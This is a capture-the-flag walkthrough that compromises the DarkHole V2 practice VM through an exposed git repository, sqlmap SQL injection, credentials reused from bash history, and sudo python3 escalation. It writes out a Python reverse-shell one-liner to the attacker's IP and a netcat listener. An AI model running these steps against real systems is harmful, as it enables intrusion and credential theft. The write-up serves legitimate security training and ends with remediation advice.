# DarkHole V2 - CTF Walkthrough

## Overview
**DarkHole V2** is a vulnerable machine designed for penetration testing practice. This walkthrough demonstrates a complete compromise from initial reconnaissance to root access.

**Difficulty:** Intermediate  
**Target IP:** 192.168.77.131  
**Attacker IP:** 192.168.77.130  

---

## Table of Contents
- [Reconnaissance](#reconnaissance)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Privilege Escalation](#privilege-escalation)
- [Flags](#flags)

---

## Reconnaissance

### Network Discovery
Using `netdiscover` to identify live hosts on the network:

```bash
netdiscover -r 192.168.77.0/16
```

**Result:** Target identified at `192.168.77.131`

![Network Discovery](netdiscover.png)

---

## Enumeration

### Port Scanning
Running `nmap` to identify open services:

```bash
nmap -sV -A -p- -T4 192.168.77.131
```

**Open Ports:**
- **22/tcp** - SSH (OpenSSH 8.2p1 Ubuntu)
- **80/tcp** - HTTP (Apache httpd 2.4.41)

**Key Finding:** Git repository discovered at `http://192.168.77.131/.git/`

![Nmap Scan](nmap.png)

### Web Application Analysis

The application "DarkHole V2" features a landing page with "The Spark Diamond" theme.

![Front Page](front_page.png)

Login page discovered at `/login.php`:

![Login Page](login_page.png)

### Git Repository Exposure

Exposed `.git` directory listing found:

![Git Exposure](git_exposure.png)

Downloaded the git repository using `wget`:

```bash
wget -r http://192.168.77.131/.git/
```

![Wget Download](wget.png)

### Analyzing Git History

Examined git commit history:

```bash
git log
```

![Git Log](login-php.png)

Inspecting a specific commit revealed **hardcoded credentials**:

```bash
git show a4d900a8d85e8938d3601f3cef113ee293028e10
```

**Discovered Credentials:**
- Email: `lush@admin.com`
- Password: `321`

![Git Show](git-show.png)

---

## Exploitation

### Authentication Bypass

Successfully logged in using the discovered credentials:

![Login Success](login-success.png)

The dashboard reveals user information for "Jehad Alqurashi" (Web Designer & Developer).

![Login Attempt](login_attempt.png)

Session cookie captured:

![Cookie Session](cookie-session.png)

### SQL Injection

Testing the application for SQL injection vulnerabilities using `sqlmap`:

```bash
sqlmap -r sql --dbs --batch
```

**Database Identified:** MySQL 5.0.12

![SQL DBMS](sql-dbms.png)

Dumping database tables:

```bash
sqlmap -r sql -D darkhole_2 --tables --dump
```

**SSH Credentials Extracted:**
- User: `jehad`
- Password: `fool`

![SQL Injection](sql_injection.png)

### SSH Access

Connected via SSH:

```bash
ssh jehad@192.168.77.131
```

![SSH Access](exploit-done.png)

---

## Privilege Escalation

### Lateral Movement (jehad → losy)

Examined bash history:

```bash
cat .bash_history
```

**Found Password:** `gang` for user `losy`

![Bash History](bash_history.png)

Switched to user `losy`:

```bash
su losy
```

Retrieved **user flag**:

```bash
cat ~/user.txt
```

**User Flag:** `DarkHole{'This_is_the_life_man_better_than_a_cruise'}`

![User CTF](user_ctf.png)

### Privilege Escalation (losy → root)

Checked sudo privileges:

```bash
sudo -l
```

**Finding:** User `losy` can run `/usr/bin/python3` as root without password.

![Losy Password](losy-passwd.png)

#### Exploitation Method 1: Direct Shell

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

#### Exploitation Method 2: Reverse Shell

Set up listener on attacking machine:

```bash
nc -nlvp 4444
```

Execute reverse shell:

```bash
sudo python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.77.130",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
```

![NC Reverse Shell](nc-reverse-shell.png)

### Root Access

Obtained root shell:

![Escalated](escalated.png)

Retrieved **root flag**:

```bash
cat /root/root.txt
```

**Root Flag:** `DarkHole Legend`

![CTF Captured](ctf_captured.png)

---

## Flags

| Flag | Location | Value |
|------|----------|-------|
| User Flag | `/home/losy/user.txt` | `DarkHole{'This_is_the_life_man_better_than_a_cruise'}` |
| Root Flag | `/root/root.txt` | `DarkHole Legend` |

---

## Attack Chain Summary

```
1. Network Discovery (netdiscover)
   ↓
2. Port Scanning (nmap)
   ↓
3. Git Repository Exposure
   ↓
4. Credential Discovery (git history)
   ↓
5. Web Application Login
   ↓
6. SQL Injection (sqlmap)
   ↓
7. SSH Access (user: jehad)
   ↓
8. Lateral Movement (jehad → losy via bash_history)
   ↓
9. Privilege Escalation (sudo python3)
   ↓
10. Root Access & Flag Capture
```

---

## Vulnerabilities Identified

1. **Exposed Git Repository** - Sensitive information disclosure
2. **Hardcoded Credentials** - Credentials stored in version control
3. **SQL Injection** - Unauthenticated database access
4. **Sensitive Information in Bash History** - Password exposure
5. **Sudo Misconfiguration** - Unrestricted python3 execution as root

---

## Remediation

- Remove `.git` directory from production web servers
- Never commit credentials to version control
- Implement input validation and parameterized queries
- Use secrets management solutions
- Configure bash to not store sensitive commands in history
- Apply principle of least privilege for sudo permissions
- Regular security audits and penetration testing

---

## Tools Used

- `netdiscover` - Network discovery
- `nmap` - Port scanning and service enumeration
- `wget` - Repository downloading
- `git` - Version control analysis
- `sqlmap` - SQL injection exploitation
- `ssh` - Remote access
- `netcat` - Reverse shell listener
- `python3` - Privilege escalation

---

## Author
**HEKKO**  
Date: February 10, 2026

## Disclaimer
This walkthrough is for educational purposes only. Only perform penetration testing on systems you own or have explicit permission to test.

---

## Acknowledgments
- DarkHole V2 VM creators
- The cybersecurity community

**Happy Hacking! 🚀**

